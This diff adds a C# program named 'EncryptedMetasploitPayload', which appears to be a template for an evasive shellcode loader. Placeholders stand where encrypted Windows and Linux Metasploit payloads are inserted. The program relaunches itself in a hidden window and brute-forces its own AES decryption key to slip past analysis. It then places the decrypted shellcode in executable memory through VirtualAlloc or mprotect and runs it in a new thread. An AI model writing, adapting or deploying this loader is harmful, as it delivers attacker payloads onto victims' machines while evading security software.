@@ -1,0 +1,150 @@
+
+using System;
+using System.Runtime.InteropServices;
+using System.Threading;
+using System.Diagnostics;
+using System.Security.Cryptography;
+using System.Text;
+
+namespace EncryptedMetasploitPayload
+{
+	class Program
+	{
+		public static void Main (string[] args)
+		{
+			OperatingSystem os = Environment.OSVersion;
+			bool x86 = IntPtr.Size == 4;
+			byte[][] payload;
+
+			if (args.Length == 0) {
+				Process prc = Process.GetCurrentProcess ();
+				Process p = new Process ();
+				p.StartInfo = prc.StartInfo;
+				p.StartInfo.FileName = System.Reflection.Assembly.GetExecutingAssembly ().Location;
+				p.StartInfo.Arguments = "1"; // this can be randomized
+				p.StartInfo.CreateNoWindow = true;
+				p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+
+				p.Start ();
+			} else if (args [0] == "1") {
+				if (os.Platform == PlatformID.Win32Windows || os.Platform == PlatformID.Win32NT) {
+
+					if (!x86)
+						{{win64}}
+					else
+						{{win86}}
+
+					foreach (byte[] code in payload) {
+						for (int i = 0; i <= 1024; i++) {
+							try {
+								byte[] uc = DecryptData (code, i.ToString());
+								IntPtr ptr = VirtualAlloc (IntPtr.Zero, (IntPtr)uc.Length, (IntPtr)0x1000, (IntPtr)0x40);
+								Marshal.Copy (uc, 0, ptr, uc.Length);
+								uc = null;
+								WindowsRun r = (WindowsRun)Marshal.GetDelegateForFunctionPointer (ptr, typeof(WindowsRun));
+
+								Thread thread = new Thread (new ThreadStart (() => {
+									r ();
+								}));
+								thread.Start ();
+								System.Threading.Thread.Sleep (500); 
+							}
+							catch 
+							{
+							}
+						}
+					}
+				} else if ((int)os.Platform == 4 || (int)os.Platform == 6 || (int)os.Platform == 128) { //linux
+
+					if (!x86)
+						{{lin64}}
+					else
+						{{lin86}}
+
+					foreach (byte[] code in payload) {
+						IntPtr ptr = IntPtr.Zero;
+						IntPtr success;
+						int pagesize = 4096;
+
+						for (int i = 0; i <= 1024; i++) {
+							try {
+								byte[] uc = DecryptData (code, i.ToString ());
+								IntPtr length = (IntPtr)(uc.Length + pagesize - 1);
+								success = posix_memalign (ref ptr, (IntPtr)32, length);
+
+								if (success != IntPtr.Zero) 
+									return;
+
+								IntPtr alignedPtr = (IntPtr)((int)ptr & ~(pagesize - 1)); //get page boundary
+								IntPtr mode = (IntPtr)(0x04 | 0x02 | 0x01); //RWX -- careful of selinux
+								success = mprotect (alignedPtr, (IntPtr)32, mode);
+
+								if (success != IntPtr.Zero) 
+									return;
+
+								Marshal.Copy (uc, 0, ptr, uc.Length);
+								uc = null;
+								LinuxRun r = (LinuxRun)Marshal.GetDelegateForFunctionPointer (ptr, typeof(LinuxRun));
+
+								Thread thread = new Thread (new ThreadStart (() => {
+									r ();
+								}));
+
+								thread.Start ();
+								System.Threading.Thread.Sleep (500);
+								break;
+							}
+							catch {
+							}
+						}
+					}
+				}
+			}
+		}
+
+		private static SymmetricAlgorithm _algorithm = new RijndaelManaged ();
+
+		private static byte[] DecryptData (byte[] cryptoData, string password)
+		{
+			GetKey (password);
+
+			ICryptoTransform decryptor = _algorithm.CreateDecryptor ();
+			byte[] data = decryptor.TransformFinalBlock (cryptoData, 0, cryptoData.Length);
+
+			return data;
+		}
+
+		private static void GetKey (string password)
+		{
+			byte[] salt = new byte[8];
+			byte[] passwordBytes = Encoding.ASCII.GetBytes (password);
+			int length = Math.Min (passwordBytes.Length, salt.Length);
+
+			for (int i = 0; i < length; i++)
+				salt [i] = passwordBytes [i];
+
+			Rfc2898DeriveBytes key = new Rfc2898DeriveBytes (password, salt);
+
+			_algorithm.Key = key.GetBytes (_algorithm.KeySize / 8);
+			_algorithm.IV = key.GetBytes (_algorithm.BlockSize / 8);
+		}
+
+		[DllImport("libc.so.6", SetLastError = true)]
+		private static extern IntPtr mprotect (IntPtr ptr, IntPtr length, IntPtr protection);
+
+		[DllImport("libc.so.6", SetLastError = true)]
+		private static extern IntPtr posix_memalign (ref IntPtr ptr, IntPtr alignment, IntPtr size);
+
+		[DllImport("libc.so.6", SetLastError = true)]
+		private static extern void free (IntPtr ptr);
+
+		[DllImport("kernel32.dll", SetLastError = true)]
+		private static extern IntPtr VirtualAlloc (IntPtr ptr, IntPtr size, IntPtr type, IntPtr mode);
+
+		[UnmanagedFunctionPointer (CallingConvention.Cdecl)]
+		private delegate void LinuxRun ();
+
+		[UnmanagedFunctionPointer (CallingConvention.StdCall)]
+		private delegate void WindowsRun ();
+	}
+}
